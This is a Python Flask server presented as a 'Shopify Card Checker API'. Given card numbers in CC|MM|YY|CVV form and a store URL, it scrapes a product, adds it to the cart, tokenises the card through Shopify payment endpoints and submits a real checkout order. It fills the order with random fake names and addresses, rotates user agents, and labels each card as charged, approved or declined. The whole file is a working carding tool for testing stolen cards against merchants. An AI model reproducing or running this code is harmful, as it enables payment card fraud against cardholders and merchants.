#!/usr/bin/env python3
# SHOPIFY CARD CHECKER API - COMPLETE INTEGRATION
# Response Format: 𝘾𝙝𝙖𝙧𝙜𝙚𝙙, 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙, 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import sys
from urllib.parse import urlparse
from fake_useragent import UserAgent
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# SHOPIFY CHECKER CLASS
# ============================================================

class ShopifyChecker:
    def __init__(self):
        self.user_agent = UserAgent().random
        self.session = None
    
    def find_between(self, s, start, end):
        try:
            if start in s and end in s:
                return (s.split(start))[1].split(end)[0]
            return ""
        except:
            return ""
    
    async def get_random_info(self):
        """Get random user info with VALID addresses"""
        us_addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"}
        ]
        
        address = random.choice(us_addresses)
        first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
        last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
        
        valid_phones = ["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999"]
        phone = random.choice(valid_phones)
        
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }
    
    def format_response(self, status, message, order_id=None):
        """Format response with exact styling"""
        if status == "CHARGED":
            formatted = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED"
            if order_id:
                formatted += f" | Order ID: {order_id}"
            return {"status": "CHARGED", "formatted_response": formatted, "response": "ORDER_PLACED"}
        
        elif status == "APPROVED":
            if "insufficient" in message.lower() or "balance" in message.lower():
                formatted = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS"
                return {"status": "APPROVED", "formatted_response": formatted, "response": "INSUFFICIENT_FUNDS"}
            elif "cvv" in message.lower() or "cvc" in message.lower() or "incorrect" in message.lower():
                formatted = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC"
                return {"status": "APPROVED", "formatted_response": formatted, "response": "INCORRECT_CVC"}
            elif "otp" in message.lower() or "3d" in message.lower() or "authentication" in message.lower():
                formatted = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED"
                return {"status": "APPROVED", "formatted_response": formatted, "response": "OTP_REQUIRED"}
            else:
                formatted = f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {message[:50] if message else 'APPROVED'}"
                return {"status": "APPROVED", "formatted_response": formatted, "response": message[:50] if message else "APPROVED"}
        
        else:
            formatted = f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED"
            return {"status": "DECLINED", "formatted_response": formatted, "response": "CARD_DECLINED"}

    async def check_card(self, site_url, card):
        """Complete Shopify card check - YOUR SCRIPT INTEGRATED"""
        async with httpx.AsyncClient(follow_redirects=True, timeout=30.0) as session:
            try:
                # Parse card
                parts = card.split('|')
                if len(parts) != 4:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ Invalid format. Use: CC|MM|YY|CVV",
                        "response": "INVALID_FORMAT"
                    }
                
                cc, mon, year, cvv = parts
                
                # STEP 1: Get product info
                product_header = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'accept-language': 'en-US,en;q=0.6',
                    'user-agent': self.user_agent,
                }
                
                product_response = await session.get(site_url + '/products.json', headers=product_header)
                if product_response.status_code != 200:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ Failed to fetch product",
                        "response": "PRODUCT_FETCH_FAILED"
                    }
                
                products_data = product_response.json()
                product = products_data['products'][0]
                variant_id = product['variants'][0]['id']
                product_handle = product['handle']
                price = product['variants'][0]['price']
                
                # STEP 2: Visit product page
                await session.get(f"{site_url}/products/{product_handle}", headers=product_header)
                product_header.update({'user-agent': UserAgent().random})
                
                # STEP 3: Add to cart
                await session.get(site_url + '/cart.js', headers=product_header)
                
                add_data = {
                    'id': str(variant_id),
                    'quantity': '1',
                    'form_type': 'product',
                }
                
                response = await session.post(site_url + '/cart/add.js', headers=product_header, data=add_data)
                if response.status_code != 200:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ Failed to add to cart",
                        "response": "CART_ADD_FAILED"
                    }
                
                # STEP 4: Get cart token
                cart_response = await session.get(f"{site_url}/cart.js", headers=product_header)
                cart_data = cart_response.json()
                token = cart_data['token']
                
                # STEP 5: Redirect to checkout
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': product_header['user-agent'],
                }
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                
                checkout_data = {
                    'checkout': '',
                    'updates[]': '1',
                }
                
                checkout_response = await session.post(f"{site_url}/cart", headers=checkout_headers, data=checkout_data)
                response_text2 = checkout_response.text
                
                # STEP 6: Extract tokens
                x_checkout_one_session_token = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                    response_text2
                )
                
                if not x_checkout_one_session_token:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ Failed to extract session token",
                        "response": "TOKEN_EXTRACTION_FAILED"
                    }
                
                session_token = x_checkout_one_session_token.group(1)
                queue_token = self.find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = self.find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
                paymentMethodIdentifier = self.find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                # STEP 7: Create payment session
                random_info = await self.get_random_info()
                fname = random_info["fname"]
                lname = random_info["lname"]
                email = random_info["email"]
                phone = random_info["phone"]
                add1 = random_info["add1"]
                city = random_info["city"]
                state_short = random_info["state_short"]
                zip_code = str(random_info["zip"])
                
                session_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions"
                ]
                
                session_created = False
                sessionid = None
                
                for endpoint in session_endpoints:
                    try:
                        headers = {
                            'authority': urlparse(endpoint).netloc,
                            'accept': 'application/json',
                            'content-type': 'application/json',
                            'origin': 'https://checkout.shopifycs.com',
                            'referer': 'https://checkout.shopifycs.com/',
                            'user-agent': self.user_agent,
                        }
                        
                        json_data = {
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': fname + ' ' + lname,
                            },
                            'payment_session_scope': urlparse(site_url).netloc,
                        }
                        
                        session_response = await session.post(endpoint, headers=headers, json=json_data)
                        
                        if session_response.status_code == 200:
                            session_data = session_response.json()
                            if "id" in session_data:
                                sessionid = session_data["id"]
                                session_created = True
                                break
                    except:
                        continue
                
                if not session_created:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ Failed to create payment session",
                        "response": "SESSION_CREATION_FAILED"
                    }
                
                # STEP 8: Submit GraphQL payment
                graphql_url = f"{site_url}/checkouts/unstable/graphql"
                
                graphql_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'referer': f"{site_url}/",
                    'user-agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-source-id': token,
                }
                
                random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
                
                graphql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1,
                                            'address2': '',
                                            'city': city,
                                            'countryCode': 'US',
                                            'postalCode': zip_code,
                                            'company': '',
                                            'firstName': fname,
                                            'lastName': lname,
                                            'zoneCode': state_short,
                                            'phone': phone,
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1,
                                                    'address2': '',
                                                    'city': city,
                                                    'countryCode': 'US',
                                                    'postalCode': zip_code,
                                                    'company': '',
                                                    'firstName': fname,
                                                    'lastName': lname,
                                                    'zoneCode': state_short,
                                                    'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'company': '',
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {'value': email, 'emailOrSmsChanged': False},
                                },
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }
                
                graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                
                if graphql_response.status_code != 200:
                    return {
                        "status": "ERROR",
                        "formatted_response": "❌ GraphQL submission failed",
                        "response": "GRAPHQL_FAILED"
                    }
                
                result_data = graphql_response.json()
                completion = result_data.get('data', {}).get('submitForCompletion', {})
                
                # STEP 9: Parse response
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        order_id = receipt.get('token', 'N/A')
                        return self.format_response("CHARGED", "ORDER_PLACED", order_id)
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return self.format_response("APPROVED", "OTP_REQUIRED")
                    elif receipt.get('__typename') == 'FailedReceipt':
                        error = receipt.get('processingError', {})
                        error_code = error.get('code', 'DECLINED')
                        return self.format_response("DECLINED", error_code)
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    error_codes = [e.get('code', '') for e in errors if 'code' in e]
                    
                    if any('INSUFFICIENT_FUNDS' in code for code in error_codes):
                        return self.format_response("APPROVED", "INSUFFICIENT_FUNDS")
                    elif any('INCORRECT_CVC' in code for code in error_codes):
                        return self.format_response("APPROVED", "INCORRECT_CVC")
                    elif any('OTP_REQUIRED' in code or '3D_SECURE' in code for code in error_codes):
                        return self.format_response("APPROVED", "OTP_REQUIRED")
                    else:
                        return self.format_response("DECLINED", "CARD_DECLINED")
                
                elif completion.get('__typename') == 'SubmitFailed':
                    reason = completion.get('reason', 'UNKNOWN')
                    return self.format_response("DECLINED", reason)
                
                else:
                    return self.format_response("DECLINED", "CARD_DECLINED")
                
            except Exception as e:
                return {
                    "status": "ERROR",
                    "formatted_response": f"❌ Error: {str(e)[:100]}",
                    "response": str(e)[:100]
                }

# ============================================================
# FLASK API ENDPOINTS
# ============================================================

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "name": "Shopify Card Checker API",
        "version": "1.0",
        "status": "online",
        "endpoints": {
            "/check": "POST - Check card on Shopify site",
            "/health": "GET - Health check"
        },
        "response_formats": {
            "CHARGED": "𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘼𝙥𝙞 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚. 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED",
            "APPROVED": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS / INCORRECT_CVC / OTP_REQUIRED",
            "DECLINED": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED"
        }
    })

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat()
    })

@app.route("/check", methods=["POST"])
def check_shopify():
    """Check card against Shopify store"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON"}), 400
        
        site_url = data.get("site") or data.get("shop_url")
        if not site_url:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        
        card = data.get("cc") or data.get("card")
        if not card:
            return jsonify({"error": "Missing 'cc' parameter"}), 400
        
        # Validate card format
        if not re.match(r"^\d+\|\d+\|\d+\|\d+$", card):
            return jsonify({"error": "Invalid format. Use: CC|MM|YY|CVV"}), 400
        
        # Run checker
        checker = ShopifyChecker()
        result = asyncio.run(checker.check_card(site_url, card))
        
        return jsonify({
            "site": site_url,
            "cc": card,
            "result": result,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"""
    ╔════════════════════════════════════════════════════════════╗
    ║  🔥 SHOPIFY CARD CHECKER API v1.0                        ║
    ║  📡 Response Format: 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 / 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 / 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙   ║
    ║  🚀 Server running on port {port}                         ║
    ║  ✅ Use POST /check with site and cc parameters           ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
